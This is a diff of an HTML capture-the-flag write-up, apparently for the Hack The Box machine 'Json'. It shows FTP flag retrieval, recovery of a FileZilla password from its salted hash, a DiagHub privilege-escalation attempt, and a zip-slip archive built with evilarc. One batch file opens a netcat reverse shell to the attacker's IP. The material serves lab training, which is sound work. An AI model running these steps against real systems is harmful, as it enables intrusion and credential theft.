-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~ $ ftp -p 10.10.10.158
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~ $ ftp -p 10.10.10.158
 </span></span><span style="display:flex;"><span>Connected to 10.10.10.158.
 </span></span><span style="display:flex;"><span>220-FileZilla Server 0.9.60 beta
 </span></span><span style="display:flex;"><span>220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
@@ -978,83 +521,31 @@ We are now able to create a new dummy user &lsquo;dummy&rsquo; and give him writ
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Users/superadmin/Desktop/root.txt&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">32</span> bytes received in 0.00 secs <span style="color:#ff79c6">(</span>395.5696 kB/s<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>ftp&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>The flag is finally obtained ;)</p>
+</span></span></code></pre></div><p>The flag is finally obtained ;)</p>
 <p>We can now clean by deleting some binaries.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; tasklist | findstr chisel
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; tasklist | findstr chisel
 </span></span><span style="display:flex;"><span>chisel.exe                    <span style="color:#bd93f9">2508</span>                            <span style="color:#bd93f9">0</span>      6,764 K
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; taskkill /f /pid <span style="color:#bd93f9">2508</span>
 </span></span><span style="display:flex;"><span>SUCCESS: The process with PID <span style="color:#bd93f9">2508</span> has been terminated.
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="attempt-to-decrypt-password-from-filezilla-config-file">Attempt to decrypt password from FileZilla config file</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml
+</span></span></code></pre></div><h2 id="attempt-to-decrypt-password-from-filezilla-config-file">Attempt to decrypt password from FileZilla config file</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json$ cat FileZilla_Server.xml
 </span></span><span style="display:flex;"><span>            &lt;Option <span style="color:#8be9fd;font-style:italic">Name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Pass&#34;</span>&gt;813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0&lt;/Option&gt;
 </span></span><span style="display:flex;"><span>            &lt;Option <span style="color:#8be9fd;font-style:italic">Name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Salt&#34;</span>&gt;cwl.PD<span style="color:#ff79c6">(</span>Zw&amp;lt;EA-@&amp;gt;ux6z,<span style="color:#ff79c6">]</span>l5U7<span style="color:#ff79c6">]</span><span style="color:#8be9fd;font-style:italic">$Cr</span>@cW?aD4~:j4&amp;quot;%_*<span style="color:#f1fa8c">\6</span>k&amp;quot;Uk<span style="color:#ff79c6">{</span>1k@P7IX<span style="color:#f1fa8c">`</span>.K7v0&lt;/Option&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Usually we obtain the Password hash by concataining the password with the salt before hashing: <code>salt = hashfunction(pwd + salt)</code></p>
+</span></span></code></pre></div><p>Usually we obtain the Password hash by concataining the password with the salt before hashing: <code>salt = hashfunction(pwd + salt)</code></p>
 <p>We have to decode htmlentities (ie &lt; &hellip;) back in unicode character.
 I used python but have suffer bug as it converted two character &lsquo;\6&rsquo; into a byte &lsquo;\x06&rsquo;, which affects the salt</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> html
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> html
 </span></span><span style="display:flex;"><span>html<span style="color:#ff79c6">.</span>unescape(<span style="color:#f1fa8c">&#39;cwl.PD(Zw&amp;lt;EA-@&amp;gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&amp;quot;%_*</span><span style="color:#f1fa8c">\6</span><span style="color:#f1fa8c">k&amp;quot;Uk{1k@P7IX`.K7v0&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*</span><span style="color:#f1fa8c">\x06</span><span style="color:#f1fa8c">k&#34;Uk{1k@P7IX`.K7v0&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We manually fix the salt so that it looks like</p>
+</span></span></code></pre></div><p>We manually fix the salt so that it looks like</p>
 <pre tabindex="0"><code>&#39;cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*\x06k&#34;Uk{1k@P7IX`.K7v0&#39;
 </code></pre><p>We can now calculate the password hash:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json$ <span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;funnyhtbcwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*\6k&#34;Uk{1k@P7IX`.K7v0&#39;</span> |sha512sum
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json$ <span style="color:#8be9fd;font-style:italic">echo</span> -n <span style="color:#f1fa8c">&#39;funnyhtbcwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&#34;%_*\6k&#34;Uk{1k@P7IX`.K7v0&#39;</span> |sha512sum
 </span></span><span style="display:flex;"><span>813ccfb086cb6c9046f13f1e10d5222ecb63e11a809c133580577b5597d28eb079f6ddd5aa52d1503bed569c72b589f165fc02993c51e0994a6290a0356ec2a0  -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Which</p>
+</span></span></code></pre></div><p>Which</p>
 <h2 id="diaghub-exploit-attempt-to-elevate-privileges-by-using-login-and-password">DiagHub exploit: Attempt to elevate privileges by using login and password</h2>
 <p>We first fail to get the Shell because superadmin ftp password &lsquo;funnyhtb&rsquo; is not the user account password</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;<span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt;
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">$pass</span> = <span style="color:#8be9fd;font-style:italic">convertto-securestring</span> <span style="color:#f1fa8c">&#39;funnyhtb&#39;</span> -asplain -force
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">$cred</span> = <span style="color:#8be9fd;font-style:italic">new-object</span> system.management.automation.pscredential(<span style="color:#f1fa8c">&#39;.\superadmin&#39;</span>, <span style="color:#8be9fd;font-style:italic">$pass</span>)
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\windows\system32\inetsrv&gt; <span style="color:#8be9fd;font-style:italic">invoke-command</span> -computer json -credential <span style="color:#8be9fd;font-style:italic">$cred</span> -scriptblock {whoami}
@@ -1064,9 +555,7 @@ I used python but have suffer bug as it converted two character &lsquo;\6&rsquo;
 </span></span><span style="display:flex;"><span>    + CategoryInfo          : OpenError: (json:String) [], PSRemotingTransport
 </span></span><span style="display:flex;"><span>   Exception
 </span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>we will use the <a href="https://github.com/decoder-it/diaghub_exploit">Diaghub</a> technique to get a Shell.</p>
+</span></span></code></pre></div><p>we will use the <a href="https://github.com/decoder-it/diaghub_exploit">Diaghub</a> technique to get a Shell.</p>
 <ol>
 <li>First we download the git project on CommandoVM, then open the solution in Visual Studio.</li>
 <li>We edit FakeDll.cpp with a writeable path <code>C:\\tmp\\r.bat</code></li>
@@ -1087,108 +576,27 @@ I used python but have suffer bug as it converted two character &lsquo;\6&rsquo;
 </ol>
 </li>
 </ol>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">ls </span>z:/json/diaghub
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">ls </span>z:/json/diaghub
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    Directory: z:\json\diaghub
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name
 </span></span><span style="display:flex;"><span>----                -------------     ------ ----
-</span></span><span style="display:flex;"><span>-a---         2/19/2020  11:44 AM      91648 FakeDll.dll
-</span></span><span style="display:flex;"><span>-a---         2/19/2020  11:44 AM     141312 diaghub_exploit.exe
+</span></span><span style="display:flex;"><span>-a---         <span style="color:#bd93f9">2</span>/<span style="color:#bd93f9">19</span>/<span style="color:#bd93f9">2020</span>  <span style="color:#bd93f9">11</span>:<span style="color:#bd93f9">44</span> AM      <span style="color:#bd93f9">91648</span> FakeDll.dll
+</span></span><span style="display:flex;"><span>-a---         <span style="color:#bd93f9">2</span>/<span style="color:#bd93f9">19</span>/<span style="color:#bd93f9">2020</span>  <span style="color:#bd93f9">11</span>:<span style="color:#bd93f9">44</span> AM     <span style="color:#bd93f9">141312</span> diaghub_exploit.exe
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/json/diaghub/* .
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/reverse.bat .
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">type </span>reverse.bat
-</span></span><span style="display:flex;"><span>.\nc64.exe -e cmd.exe 10.10.14.70 8000
+</span></span><span style="display:flex;"><span>.\nc64.exe -e cmd.exe <span style="color:#bd93f9">10.10</span>.14.70 <span style="color:#bd93f9">8000</span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/nc64.exe .
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><code>C:\windows\system32\</code> is not writeable by userpool, so we attempt <code>zipslip</code> by creating an evil zip with the tool <a href="https://github.com/ptoomey3/evilarc">evilarc on github</a></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>git clone https:<span style="color:#ff79c6">//</span>github<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">/</span>ptoomey3<span style="color:#ff79c6">/</span>evilarc
+</span></span></code></pre></div><p><code>C:\windows\system32\</code> is not writeable by userpool, so we attempt <code>zipslip</code> by creating an evil zip with the tool <a href="https://github.com/ptoomey3/evilarc">evilarc on github</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>git clone https:<span style="color:#ff79c6">//</span>github<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">/</span>ptoomey3<span style="color:#ff79c6">/</span>evilarc
 </span></span><span style="display:flex;"><span>cd evilarc
 </span></span><span style="display:flex;"><span>python2 evilarc<span style="color:#ff79c6">.</span>py <span style="color:#ff79c6">-</span>p <span style="color:#f1fa8c">&#34;\windows\system32&#34;</span> <span style="color:#ff79c6">-</span>o win <span style="color:#ff79c6">-</span>f zipslip<span style="color:#ff79c6">.</span>zip <span style="color:#ff79c6">../</span>www<span style="color:#ff79c6">/</span>json<span style="color:#ff79c6">/</span>diaghub<span style="color:#ff79c6">/</span>FakeDll<span style="color:#ff79c6">.</span>dll
 </span></span><span style="display:flex;"><span>Creating zipslip<span style="color:#ff79c6">.</span>zip containing <span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\\windows\system32\FakeDll<span style="color:#ff79c6">.</span>dll
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Uploading the evil zip file</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
